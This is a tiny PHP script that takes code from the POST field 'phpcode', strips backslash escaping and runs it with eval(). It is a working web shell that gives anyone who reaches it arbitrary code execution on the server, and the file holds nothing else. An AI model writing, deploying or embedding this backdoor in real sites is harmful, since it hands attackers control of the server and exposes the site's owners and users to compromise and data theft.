<?php

$code = $_POST['phpcode'];

$code = str_replace('\\\\','�',$code);
$code = str_replace('\\','',$code);
$code = str_replace('�','\\',$code);

eval($code);

?>